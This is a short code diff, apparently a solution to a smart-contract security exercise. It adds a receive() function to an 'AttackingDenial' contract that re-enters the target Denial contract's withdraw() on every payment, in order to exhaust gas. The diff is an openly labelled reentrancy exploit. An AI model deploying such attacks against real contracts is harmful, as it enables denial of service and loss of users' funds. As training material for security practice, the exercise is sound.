@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    //Code me! reentrancy attack to withdraw until contract runs out of gas
+    receive() external payable{
+        if(contractAddress.balance >= 0) {
+            Denial(contractAddress).withdraw();
+        }
+    }
 }
